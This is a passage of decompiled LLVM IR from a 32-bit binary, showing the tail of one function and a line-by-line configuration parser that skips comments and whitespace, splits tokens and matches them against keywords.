  uselistorder i32 (i32, i32, i32, i32)* @function_8052724, { 0, 4, 3, 2, 1 }
  uselistorder i32 10000, { 5, 2, 3, 4, 0, 1 }
  uselistorder i32 228, { 2, 1, 3, 0 }
  uselistorder i32 232, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8052758, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 101, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @function_8052690, { 1, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_805280c, { 1, 2, 0 }
  uselistorder i32 17, { 8, 6, 2, 3, 4, 5, 9, 1, 7, 0 }
  uselistorder i32 176, { 4, 2, 3, 1, 0 }
  uselistorder i32 (i32)* @function_8052304, { 0, 2, 1 }
  uselistorder i32 158, { 1, 0 }
  uselistorder i32 156, { 1, 2, 0 }
  uselistorder i32 172, { 1, 2, 3, 0 }
  uselistorder i32 220, { 2, 3, 1, 0 }
  uselistorder i32 216, { 1, 2, 0 }
  uselistorder i32 224, { 1, 3, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 3, 1, 2, 0 }
  uselistorder i32 ()* @function_80565d4, { 1, 0 }
  uselistorder i32 200, { 2, 1, 3, 4, 0 }
  uselistorder i32 104, { 3, 1, 4, 2, 0 }
  uselistorder i32 116, { 3, 5, 1, 2, 6, 4, 0 }
  uselistorder i32 72, { 1, 3, 4, 2, 5, 0 }
  uselistorder i32 84, { 5, 1, 6, 2, 4, 3, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 14, 15, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 49, 50, 51, 47, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 -12, { 12, 6, 5, 7, 1, 8, 9, 10, 11, 0, 13, 25, 27, 24, 2, 18, 14, 3, 15, 16, 17, 19, 20, 4, 22, 21, 23, 26 }
  uselistorder i32 -8, { 9, 3, 2, 4, 0, 5, 6, 7, 8, 10, 24, 22, 23, 21, 1, 16, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_805e884.401, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0, 2 }
  uselistorder i64* @global_var_8064b40.400, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8064b28.399 to i32), { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 512, { 14, 5, 15, 16, 6, 9, 0, 1, 2, 3, 10, 11, 12, 7, 13, 4, 8 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055a4d, { 1, 0 }
  uselistorder label %dec_label_pc_8055a4a, { 1, 0 }
  uselistorder label %dec_label_pc_80559da, { 1, 0 }
  uselistorder label %dec_label_pc_80559c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80559b1, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_805598c.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8055984, { 1, 0 }
  uselistorder label %dec_label_pc_805596b, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8055920, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_80558be, { 1, 0 }
  uselistorder label %dec_label_pc_805588e, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8055884, { 1, 0 }
  uselistorder label %dec_label_pc_8055879, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055876, { 1, 0 }
  uselistorder label %dec_label_pc_80557f1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8055739, { 1, 0 }
  uselistorder label %dec_label_pc_80555bb, { 1, 0 }
  uselistorder label %dec_label_pc_8055584, { 1, 0 }
  uselistorder label %dec_label_pc_80554f6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055402, { 1, 0 }
  uselistorder label %dec_label_pc_80553ec, { 1, 0 }
}

define i32 @function_8055a5c() local_unnamed_addr {
dec_label_pc_8055a5c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8055a5c = load i32, i32* @ebp, align 4
  store i32 134561879, i32* %stack_var_-216, align 4
  %v3_8055a6b = ptrtoint i32* %stack_var_-216 to i32
  %v2_8055a70 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055a70, i32* @eax, align 4
  %v2_8055a78 = call i32 @function_805405a(i32 %v2_8055a70, i32 134561879)
  %v1_8055a84 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e888.337 to i32))
  store i32 %v1_8055a84, i32* @eax, align 4
  %v0_8055a8c = load i32, i32* @global_var_8064f74.338, align 4
  %tmp39 = icmp slt i32 %v0_8055a8c, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_8055c83, label %dec_label_pc_8055a99

dec_label_pc_8055a99:                             ; preds = %dec_label_pc_8055a5c
  store i32 ptrtoint (i32* @global_var_805d410.404 to i32), i32* %stack_var_-216, align 4
  %v2_8055aa5 = call i32 @function_8055e78(i32 ptrtoint ([17 x i8]* @global_var_805d3de.405 to i32), i32 ptrtoint (i32* @global_var_805d410.404 to i32))
  store i32 %v2_8055aa5, i32* @eax, align 4
  %v1_8055aad = icmp eq i32 %v2_8055aa5, 0
  store i32 %v2_8055aa5, i32* @ebp, align 4
  %v1_8055ab1 = icmp eq i1 %v1_8055aad, false
  br i1 %v1_8055ab1, label %dec_label_pc_8055c4e.preheader, label %dec_label_pc_8055ab7

dec_label_pc_8055ab7:                             ; preds = %dec_label_pc_8055a99
  store i32 ptrtoint (i32* @global_var_805d410.404 to i32), i32* %stack_var_-216, align 4
  %v2_8055ac3 = call i32 @function_8055e78(i32 ptrtoint ([24 x i8]* @global_var_805d3ef.406 to i32), i32 ptrtoint (i32* @global_var_805d410.404 to i32))
  %v1_8055acb = icmp eq i32 %v2_8055ac3, 0
  store i32 %v2_8055ac3, i32* @ebp, align 4
  %v1_8055acf = icmp eq i1 %v1_8055acb, false
  br i1 %v1_8055acf, label %dec_label_pc_8055c4e.preheader, label %dec_label_pc_8055c78

dec_label_pc_8055c4e.preheader:                   ; preds = %dec_label_pc_8055a99, %dec_label_pc_8055ab7
  %v2_8055c55 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8055b89 = add i32 %v3_8055a6b, 164
  %v4_8055b78 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8055c4e

dec_label_pc_8055ada:                             ; preds = %dec_label_pc_8055ae5
  %v1_8055ada = add i32 %v0_8055ada54, 1
  store i32 %v1_8055ada, i32* @ebx, align 4
  %v1_8055adb = inttoptr i32 %v1_8055ada to i8*
  %v2_8055adb = load i8, i8* %v1_8055adb, align 1
  %v3_8055adb = zext i8 %v2_8055adb to i32
  %v5_8055adb = and i32 %v6_8055adb57, -256
  %v6_8055adb = or i32 %v3_8055adb, %v5_8055adb
  store i32 %v6_8055adb, i32* @ecx, align 4
  %v4_8055add = icmp eq i8 %v2_8055adb, 0
  br i1 %v4_8055add, label %dec_label_pc_8055c4e, label %dec_label_pc_8055ae5

dec_label_pc_8055ae5:                             ; preds = %dec_label_pc_8055ae5.lr.ph, %dec_label_pc_8055ada
  %v6_8055adb57 = phi i32 [ %v6_8055adb51, %dec_label_pc_8055ae5.lr.ph ], [ %v6_8055adb, %dec_label_pc_8055ada ]
  %v2_8055adb56 = phi i8 [ %v2_8055adb48, %dec_label_pc_8055ae5.lr.ph ], [ %v2_8055adb, %dec_label_pc_8055ada ]
  %v1_8055adb55 = phi i8* [ %v1_8055adb47, %dec_label_pc_8055ae5.lr.ph ], [ %v1_8055adb, %dec_label_pc_8055ada ]
  %v0_8055ada54 = phi i32 [ %v0_8055adb.pre, %dec_label_pc_8055ae5.lr.ph ], [ %v1_8055ada, %dec_label_pc_8055ada ]
  store i32 %v0_8055ae5.pre, i32* @eax, align 4
  %v2_8055aea = sext i8 %v2_8055adb56 to i32
  store i32 %v2_8055aea, i32* @edx, align 4
  %v2_8055aed = mul nsw i32 %v2_8055aea, 2
  %v3_8055aed = add i32 %v0_8055ae5.pre, %v2_8055aed
  %v4_8055aed = inttoptr i32 %v3_8055aed to i8*
  %v5_8055aed = load i8, i8* %v4_8055aed, align 1
  %v6_8055aed = and i8 %v5_8055aed, 32
  %v7_8055aed = icmp eq i8 %v6_8055aed, 0
  %v1_8055af1 = icmp eq i1 %v7_8055aed, false
  br i1 %v1_8055af1, label %dec_label_pc_8055ada, label %dec_label_pc_8055af3

dec_label_pc_8055af3:                             ; preds = %dec_label_pc_8055ae5
  %v10_8055af3 = icmp eq i8 %v2_8055adb56, 10
  br i1 %v10_8055af3, label %dec_label_pc_8055c4e, label %dec_label_pc_8055afc

dec_label_pc_8055afc:                             ; preds = %dec_label_pc_8055af3
  %v10_8055afc = icmp eq i8 %v2_8055adb56, 35
  %v1_8055b07 = icmp eq i1 %v10_8055afc, false
  br i1 %v1_8055b07, label %dec_label_pc_8055b58.preheader, label %dec_label_pc_8055c4e

dec_label_pc_8055b58.preheader:                   ; preds = %dec_label_pc_8055afc
  %v2_8055b584 = load i8, i8* %v1_8055adb55, align 1
  %v3_8055b585 = icmp eq i8 %v2_8055b584, 0
  br i1 %v3_8055b585, label %dec_label_pc_8055b64, label %dec_label_pc_8055b5d

dec_label_pc_8055b0e:                             ; preds = %dec_label_pc_8055b5d
  store i32 %stack_var_-196.011, i32* @eax, align 4
  %v1_8055b12 = load i32, i32* @esp, align 4
  %v3_8055b12 = mul nuw nsw i32 %stack_var_-196.011, 4
  %v4_8055b12 = add nuw nsw i32 %v3_8055b12, 152
  %v5_8055b12 = add i32 %v4_8055b12, %v1_8055b12
  %v6_8055b12 = inttoptr i32 %v5_8055b12 to i32*
  store i32 %v0_8055b12, i32* %v6_8055b12, align 4
  %v0_8055b1c.pre = load i32, i32* @ebx, align 4
  %v4_8055b1c.pre = load i32, i32* @ecx, align 4
  %v1_8055b1c58 = inttoptr i32 %v0_8055b1c.pre to i8*
  %v2_8055b1c59 = load i8, i8* %v1_8055b1c58, align 1
  %v3_8055b1c60 = zext i8 %v2_8055b1c59 to i32
  %v5_8055b1c61 = and i32 %v4_8055b1c.pre, -256
  %v6_8055b1c62 = or i32 %v3_8055b1c60, %v5_8055b1c61
  %v4_8055b1e63 = icmp eq i8 %v2_8055b1c59, 0
  br i1 %v4_8055b1e63, label %dec_label_pc_8055b3b.preheader, label %dec_label_pc_8055b22.lr.ph

dec_label_pc_8055b22.lr.ph:                       ; preds = %dec_label_pc_8055b0e
  %v0_8055b22.pre = load i32, i32* @global_var_805e61c, align 4
  br label %dec_label_pc_8055b22

dec_label_pc_8055b1b:                             ; preds = %dec_label_pc_8055b30
  %v1_8055b1b = add i32 %v0_8055b1b65, 1
  store i32 %v1_8055b1b, i32* @ebx, align 4
  %v1_8055b1c = inttoptr i32 %v1_8055b1b to i8*
  %v2_8055b1c = load i8, i8* %v1_8055b1c, align 1
  %v3_8055b1c = zext i8 %v2_8055b1c to i32
  %v5_8055b1c = and i32 %v6_8055b1c67, -256
  %v6_8055b1c = or i32 %v3_8055b1c, %v5_8055b1c
  %v4_8055b1e = icmp eq i8 %v2_8055b1c, 0
  br i1 %v4_8055b1e, label %dec_label_pc_8055b3b.preheader, label %dec_label_pc_8055b22

dec_label_pc_8055b22:                             ; preds = %dec_label_pc_8055b22.lr.ph, %dec_label_pc_8055b1b
  %v6_8055b1c67 = phi i32 [ %v6_8055b1c62, %dec_label_pc_8055b22.lr.ph ], [ %v6_8055b1c, %dec_label_pc_8055b1b ]
  %v2_8055b1c66 = phi i8 [ %v2_8055b1c59, %dec_label_pc_8055b22.lr.ph ], [ %v2_8055b1c, %dec_label_pc_8055b1b ]
  %v0_8055b1b65 = phi i32 [ %v0_8055b1c.pre, %dec_label_pc_8055b22.lr.ph ], [ %v1_8055b1b, %dec_label_pc_8055b1b ]
  store i32 %v0_8055b22.pre, i32* @eax, align 4
  %v2_8055b27 = sext i8 %v2_8055b1c66 to i32
  store i32 %v2_8055b27, i32* @edx, align 4
  %v2_8055b2a = mul nsw i32 %v2_8055b27, 2
  %v3_8055b2a = add i32 %v0_8055b22.pre, %v2_8055b2a
  %v4_8055b2a = inttoptr i32 %v3_8055b2a to i8*
  %v5_8055b2a = load i8, i8* %v4_8055b2a, align 1
  %v6_8055b2a = and i8 %v5_8055b2a, 32
  %v7_8055b2a = icmp eq i8 %v6_8055b2a, 0
  %v1_8055b2e = icmp eq i1 %v7_8055b2a, false
  br i1 %v1_8055b2e, label %dec_label_pc_8055b3b.preheader, label %dec_label_pc_8055b30

dec_label_pc_8055b30:                             ; preds = %dec_label_pc_8055b22
  %v10_8055b30 = icmp eq i8 %v2_8055b1c66, 10
  %v1_8055b33 = icmp eq i1 %v10_8055b30, false
  br i1 %v1_8055b33, label %dec_label_pc_8055b1b, label %dec_label_pc_8055b3b.preheader

dec_label_pc_8055b3b.preheader:                   ; preds = %dec_label_pc_8055b30, %dec_label_pc_8055b22, %dec_label_pc_8055b1b, %dec_label_pc_8055b0e
  %v0_8055b1b.lcssa = phi i32 [ %v0_8055b1c.pre, %dec_label_pc_8055b0e ], [ %v1_8055b1b, %dec_label_pc_8055b1b ], [ %v0_8055b1b65, %dec_label_pc_8055b22 ], [ %v0_8055b1b65, %dec_label_pc_8055b30 ]
  %v6_8055b1c.lcssa = phi i32 [ %v6_8055b1c62, %dec_label_pc_8055b0e ], [ %v6_8055b1c, %dec_label_pc_8055b1b ], [ %v6_8055b1c67, %dec_label_pc_8055b22 ], [ %v6_8055b1c67, %dec_label_pc_8055b30 ]
  %v1_8055b3b73 = inttoptr i32 %v0_8055b1b.lcssa to i8*
  %v2_8055b3b74 = load i8, i8* %v1_8055b3b73, align 1
  %v3_8055b3b75 = zext i8 %v2_8055b3b74 to i32
  %v5_8055b3b76 = and i32 %v6_8055b1c.lcssa, -256
  %v6_8055b3b77 = or i32 %v3_8055b3b75, %v5_8055b3b76
  store i32 %v6_8055b3b77, i32* @ecx, align 4
  %v4_8055b3d78 = icmp eq i8 %v2_8055b3b74, 0
  br i1 %v4_8055b3d78, label %dec_label_pc_8055b54, label %dec_label_pc_8055b41

dec_label_pc_8055b37:                             ; preds = %dec_label_pc_8055b4f, %dec_label_pc_8055b41
  store i8 0, i8* %v1_8055b3b81, align 1
  %v0_8055b3a = load i32, i32* @ebx, align 4
  %v1_8055b3a = add i32 %v0_8055b3a, 1
  store i32 %v1_8055b3a, i32* @ebx, align 4
  %v4_8055b3b.pre = load i32, i32* @ecx, align 4
  %v1_8055b3b = inttoptr i32 %v1_8055b3a to i8*
  %v2_8055b3b = load i8, i8* %v1_8055b3b, align 1
  %v3_8055b3b = zext i8 %v2_8055b3b to i32
  %v5_8055b3b = and i32 %v4_8055b3b.pre, -256
  %v6_8055b3b = or i32 %v3_8055b3b, %v5_8055b3b
  store i32 %v6_8055b3b, i32* @ecx, align 4
  %v4_8055b3d = icmp eq i8 %v2_8055b3b, 0
  br i1 %v4_8055b3d, label %dec_label_pc_8055b54, label %dec_label_pc_8055b41

dec_label_pc_8055b41:                             ; preds = %dec_label_pc_8055b3b.preheader, %dec_label_pc_8055b37
  %v2_8055b3b82 = phi i8 [ %v2_8055b3b, %dec_label_pc_8055b37 ], [ %v2_8055b3b74, %dec_label_pc_8055b3b.preheader ]
  %v1_8055b3b81 = phi i8* [ %v1_8055b3b, %dec_label_pc_8055b37 ], [ %v1_8055b3b73, %dec_label_pc_8055b3b.preheader ]
  %v0_8055b5880 = phi i32 [ %v1_8055b3a, %dec_label_pc_8055b37 ], [ %v0_8055b1b.lcssa, %dec_label_pc_8055b3b.preheader ]
  %v0_8055b41 = load i32, i32* @global_var_805e61c, align 4
  store i32 %v0_8055b41, i32* @eax, align 4
  %v2_8055b46 = sext i8 %v2_8055b3b82 to i32
  store i32 %v2_8055b46, i32* @edx, align 4
  %v2_8055b49 = mul nsw i32 %v2_8055b46, 2
  %v3_8055b49 = add i32 %v0_8055b41, %v2_8055b49
  %v4_8055b49 = inttoptr i32 %v3_8055b49 to i8*
  %v5_8055b49 = load i8, i8* %v4_8055b49, align 1
  %v6_8055b49 = and i8 %v5_8055b49, 32
  %v7_8055b49 = icmp eq i8 %v6_8055b49, 0
  %v1_8055b4d = icmp eq i1 %v7_8055b49, false
  br i1 %v1_8055b4d, label %dec_label_pc_8055b37, label %dec_label_pc_8055b4f

dec_label_pc_8055b4f:                             ; preds = %dec_label_pc_8055b41
  %v10_8055b4f = icmp eq i8 %v2_8055b3b82, 10
  br i1 %v10_8055b4f, label %dec_label_pc_8055b37, label %dec_label_pc_8055b54

dec_label_pc_8055b54:                             ; preds = %dec_label_pc_8055b37, %dec_label_pc_8055b4f, %dec_label_pc_8055b3b.preheader
  %v0_8055b58.lcssa = phi i32 [ %v0_8055b1b.lcssa, %dec_label_pc_8055b3b.preheader ], [ %v0_8055b5880, %dec_label_pc_8055b4f ], [ %v1_8055b3a, %dec_label_pc_8055b37 ]
  %v1_8055b3b.lcssa = phi i8* [ %v1_8055b3b73, %dec_label_pc_8055b3b.preheader ], [ %v1_8055b3b81, %dec_label_pc_8055b4f ], [ %v1_8055b3b, %dec_label_pc_8055b37 ]
  %v4_8055b54 = add nuw nsw i32 %stack_var_-196.011, 1
  %v2_8055b58 = load i8, i8* %v1_8055b3b.lcssa, align 1
  %v3_8055b58 = icmp eq i8 %v2_8055b58, 0
  br i1 %v3_8055b58, label %dec_label_pc_8055b64, label %dec_label_pc_8055b5d

dec_label_pc_8055b5d:                             ; preds = %dec_label_pc_8055b58.preheader, %dec_label_pc_8055b54
  %v0_8055b12 = phi i32 [ %v0_8055b58.lcssa, %dec_label_pc_8055b54 ], [ %v0_8055ada54, %dec_label_pc_8055b58.preheader ]
  %stack_var_-196.011 = phi i32 [ %v4_8055b54, %dec_label_pc_8055b54 ], [ 0, %dec_label_pc_8055b58.preheader ]
  %v7_8055b62 = icmp sgt i32 %stack_var_-196.011, 4
  br i1 %v7_8055b62, label %dec_label_pc_8055b64, label %dec_label_pc_8055b0e

dec_label_pc_8055b64:                             ; preds = %dec_label_pc_8055b54, %dec_label_pc_8055b5d, %dec_label_pc_8055b58.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8055b58.preheader ], [ %v4_8055b54, %dec_label_pc_8055b54 ], [ %stack_var_-196.011, %dec_label_pc_8055b5d ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8055b6b = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805d407.407 to i32), i32* %stack_var_-216, align 4
  %v5_8055b78 = call i32 @function_80565b4(i8* %v4_8055b78, i32 ptrtoint ([11 x i8]* @global_var_805d407.407 to i32), i32 %v0_8055b6b, i32 %v0_8055b6b)
  store i32 %v5_8055b78, i32* @eax, align 4
  %v1_8055b80 = icmp eq i32 %v5_8055b78, 0
  br i1 %v1_8055b80, label %dec_label_pc_8055ba8.preheader, label %dec_label_pc_8055bb9

dec_label_pc_8055ba8.preheader:                   ; preds = %dec_label_pc_8055b64
  %v0_8055ba887 = load i32, i32* @esi, align 4
  %v5_8055bac95 = icmp slt i32 %v0_8055ba887, %stack_var_-196.0.lcssa
  br i1 %v5_8055bac95, label %dec_label_pc_8055bae.lr.ph, label %dec_label_pc_8055bb9

dec_label_pc_8055bae.lr.ph:                       ; preds = %dec_label_pc_8055ba8.preheader
  %v0_8055bae.pre = load i32, i32* @global_var_8064f74.338, align 4
  br label %dec_label_pc_8055bae

dec_label_pc_8055b86:                             ; preds = %dec_label_pc_8055bae
  %v2_8055b89 = mul i32 %v0_8055ba896, 4
  %v4_8055b89 = add i32 %v2_8055b89, %v3_8055b89
  %v5_8055b89 = inttoptr i32 %v4_8055b89 to i32*
  %v6_8055b89 = load i32, i32* %v5_8055b89, align 4
  %v1_8055b90 = add i32 %v0_8055ba896, 1
  store i32 %v1_8055b90, i32* @esi, align 4
  %v1_8055b91 = call i32 @function_805669c(i32 %v6_8055b89)
  %v1_8055b99 = load i32, i32* @ebx, align 4
  %v2_8055b99 = mul i32 %v1_8055b99, 4
  %v3_8055b99 = add i32 %v2_8055b99, 134631272
  %v4_8055b99 = inttoptr i32 %v3_8055b99 to i32*
  store i32 %v1_8055b91, i32* %v4_8055b99, align 4
  %v0_8055ba0 = load i32, i32* @ebx, align 4
  %v1_8055ba0 = add i32 %v0_8055ba0, 1
  store i32 %v1_8055ba0, i32* @eax, align 4
  store i32 %v1_8055ba0, i32* @global_var_8064f74.338, align 4
  %v0_8055ba8 = load i32, i32* @esi, align 4
  %v5_8055bac = icmp slt i32 %v0_8055ba8, %stack_var_-196.0.lcssa
  br i1 %v5_8055bac, label %dec_label_pc_8055bae, label %dec_label_pc_8055bb9

dec_label_pc_8055bae:                             ; preds = %dec_label_pc_8055bae.lr.ph, %dec_label_pc_8055b86
  %v0_8055bae = phi i32 [ %v0_8055bae.pre, %dec_label_pc_8055bae.lr.ph ], [ %v1_8055ba0, %dec_label_pc_8055b86 ]
  %v0_8055ba896 = phi i32 [ %v0_8055ba887, %dec_label_pc_8055bae.lr.ph ], [ %v0_8055ba8, %dec_label_pc_8055b86 ]
  store i32 %v0_8055bae, i32* @ebx, align 4
  %v7_8055bb7 = icmp sgt i32 %v0_8055bae, 2
  br i1 %v7_8055bb7, label %dec_label_pc_8055bb9, label %dec_label_pc_8055b86

dec_label_pc_8055bb9:                             ; preds = %dec_label_pc_8055ba8.preheader, %dec_label_pc_8055b86, %dec_label_pc_8055bae, %dec_label_pc_8055b64
  %v0_8055bb9 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805d412.408 to i32), i32* %stack_var_-216, align 4
  %v0_8055bc0 = load i32, i32* @edi, align 4
  %v4_8055bc1 = inttoptr i32 %v0_8055bc0 to i8*
  %v5_8055bc1 = call i32 @function_80565b4(i8* %v4_8055bc1, i32 ptrtoint ([7 x i8]* @global_var_805d412.408 to i32), i32 %v0_8055bb9, i32 %v0_8055bb9)
  store i32 %v5_8055bc1, i32* @eax, align 4
  %v1_8055bc9 = icmp eq i32 %v5_8055bc1, 0
  br i1 %v1_8055bc9, label %dec_label_pc_8055c0b.preheader, label %dec_label_pc_8055bcd

dec_label_pc_8055bcd:                             ; preds = %dec_label_pc_8055bb9
  %v0_8055bcd = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805d419.409 to i32), i32* %stack_var_-216, align 4
  %v0_8055bd4 = load i32, i32* @edi, align 4
  %v4_8055bd5 = inttoptr i32 %v0_8055bd4 to i8*
  %v5_8055bd5 = call i32 @function_80565b4(i8* %v4_8055bd5, i32 ptrtoint ([7 x i8]* @global_var_805d419.409 to i32), i32 %v0_8055bcd, i32 %v0_8055bcd)
  %v1_8055bdd = icmp eq i32 %v5_8055bd5, 0
  br i1 %v1_8055bdd, label %dec_label_pc_8055c0b.preheader, label %dec_label_pc_8055c4e

dec_label_pc_8055c0b.preheader:                   ; preds = %dec_label_pc_8055bb9, %dec_label_pc_8055bcd
  %v0_8055c0b97 = load i32, i32* @global_var_8064f78.402, align 8
  %tmp41100 = icmp slt i32 %v0_8055c0b97, 1
  %tmp42101 = icmp eq i1 %tmp41100, false
  br i1 %tmp42101, label %dec_label_pc_8055be3, label %dec_label_pc_8055c14

dec_label_pc_8055be3:                             ; preds = %dec_label_pc_8055c0b.preheader, %dec_label_pc_8055be3.dec_label_pc_8055be3_crit_edge
  %v0_8055c0b102 = phi i32 [ %v0_8055c0b, %dec_label_pc_8055be3.dec_label_pc_8055be3_crit_edge ], [ %v0_8055c0b97, %dec_label_pc_8055c0b.preheader ]
  %v1_8055be3 = add i32 %v0_8055c0b102, -1
  %v1_8055be7 = mul i32 %v1_8055be3, 4
  %v2_8055be7 = add i32 %v1_8055be7, 134631256
  %v3_8055be7 = inttoptr i32 %v2_8055be7 to i32*
  %v4_8055be7 = load i32, i32* %v3_8055be7, align 4
  store i32 %v1_8055be3, i32* @global_var_8064f78.402, align 8
  %v1_8055bf3 = call i32 @function_8053391(i32 %v4_8055be7)
  %v0_8055bf8 = load i32, i32* @global_var_8064f78.402, align 8
  %v1_8055c00 = mul i32 %v0_8055bf8, 4
  %v2_8055c00 = add i32 %v1_8055c00, ptrtoint (i32* @global_var_8064f58.410 to i32)
  %v3_8055c00 = inttoptr i32 %v2_8055c00 to i32*
  store i32 0, i32* %v3_8055c00, align 4
  %v0_8055c0b = load i32, i32* @global_var_8064f78.402, align 8
  %tmp41 = icmp slt i32 %v0_8055c0b, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_8055be3.dec_label_pc_8055be3_crit_edge, label %dec_label_pc_8055c14

dec_label_pc_8055be3.dec_label_pc_8055be3_crit_edge: ; preds = %dec_label_pc_8055be3
  br label %dec_label_pc_8055be3

dec_label_pc_8055c14:                             ; preds = %dec_label_pc_8055be3, %dec_label_pc_8055c0b.preheader
  %v0_8055c0b.lcssa = phi i32 [ %v0_8055c0b97, %dec_label_pc_8055c0b.preheader ], [ %v0_8055c0b, %dec_label_pc_8055be3 ]
  store i32 1, i32* @esi, align 4
  %v5_8055c41111 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8055c41111, label %dec_label_pc_8055c43, label %dec_label_pc_8055c4e

dec_label_pc_8055c1b:                             ; preds = %dec_label_pc_8055c43
  %v2_8055c1e = mul i32 %v0_8055c25113, 4
  %v4_8055c1e = add i32 %v2_8055c1e, %v3_8055b89
  %v5_8055c1e = inttoptr i32 %v4_8055c1e to i32*
  %v6_8055c1e = load i32, i32* %v5_8055c1e, align 4
  %v1_8055c25 = add i32 %v0_8055c25113, 1
  store i32 %v1_8055c25, i32* @esi, align 4
  %v1_8055c26 = call i32 @function_805669c(i32 %v6_8055c1e)
  %v1_8055c2e = load i32, i32* @ebx, align 4
  %v2_8055c2e = mul i32 %v1_8055c2e, 4
  %v3_8055c2e = add i32 %v2_8055c2e, 134631256
  %v4_8055c2e = inttoptr i32 %v3_8055c2e to i32*
  store i32 %v1_8055c26, i32* %v4_8055c2e, align 4
  %v0_8055c35 = load i32, i32* @ebx, align 4
  %v1_8055c35 = add i32 %v0_8055c35, 1
  store i32 %v1_8055c35, i32* @global_var_8064f78.402, align 8
  %v0_8055c3d.pre = load i32, i32* @esi, align 4
  %v5_8055c41 = icmp slt i32 %v0_8055c3d.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8055c41, label %dec_label_pc_8055c43, label %dec_label_pc_8055c4e

dec_label_pc_8055c43:                             ; preds = %dec_label_pc_8055c14, %dec_label_pc_8055c1b
  %v0_8055c25113 = phi i32 [ %v0_8055c3d.pre, %dec_label_pc_8055c1b ], [ 1, %dec_label_pc_8055c14 ]
  %v0_8055c43112 = phi i32 [ %v1_8055c35, %dec_label_pc_8055c1b ], [ %v0_8055c0b.lcssa, %dec_label_pc_8055c14 ]
  store i32 %v0_8055c43112, i32* @ebx, align 4
  %v7_8055c4c = icmp sgt i32 %v0_8055c43112, 3
  br i1 %v7_8055c4c, label %dec_label_pc_8055c4e, label %dec_label_pc_8055c1b

dec_label_pc_8055c4e:                             ; preds = %dec_label_pc_8055adb.preheader, %dec_label_pc_8055ada, %dec_label_pc_8055c14, %dec_label_pc_8055c43, %dec_label_pc_8055c1b, %dec_label_pc_8055bcd, %dec_label_pc_8055afc, %dec_label_pc_8055af3, %dec_label_pc_8055c4e.preheader
  %v0_8055c4e = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8055c55, i32* @ebx, align 4
  %v3_8055c5a = call i32 @function_80562b0(i32 %v2_8055c55, i32 128, i32 %v0_8055c4e)
  store i32 %v3_8055c5a, i32* @eax, align 4
  %v1_8055c62 = icmp eq i32 %v3_8055c5a, 0
  %v1_8055c64 = icmp eq i1 %v1_8055c62, false
  br i1 %v1_8055c64, label %dec_label_pc_8055adb.preheader, label %dec_label_pc_8055c6a

dec_label_pc_8055adb.preheader:                   ; preds = %dec_label_pc_8055c4e
  %v0_8055adb.pre = load i32, i32* @ebx, align 4
  %v4_8055adb.pre = load i32, i32* @ecx, align 4
  %v1_8055adb47 = inttoptr i32 %v0_8055adb.pre to i8*
  %v2_8055adb48 = load i8, i8* %v1_8055adb47, align 1
  %v3_8055adb49 = zext i8 %v2_8055adb48 to i32
  %v5_8055adb50 = and i32 %v4_8055adb.pre, -256
  %v6_8055adb51 = or i32 %v3_8055adb49, %v5_8055adb50
  store i32 %v6_8055adb51, i32* @ecx, align 4
  %v4_8055add52 = icmp eq i8 %v2_8055adb48, 0
  br i1 %v4_8055add52, label %dec_label_pc_8055c4e, label %dec_label_pc_8055ae5.lr.ph

dec_label_pc_8055ae5.lr.ph:                       ; preds = %dec_label_pc_8055adb.preheader
  %v0_8055ae5.pre = load i32, i32* @global_var_805e61c, align 4
  br label %dec_label_pc_8055ae5

dec_label_pc_8055c6a:                             ; preds = %dec_label_pc_8055c4e
  %v0_8055c6d = load i32, i32* @ebp, align 4
  %v1_8055c6e = inttoptr i32 %v0_8055c6d to i16*
  %v2_8055c6e = call i32 @function_8055d68(i16* %v1_8055c6e)
  br label %dec_label_pc_8055c83

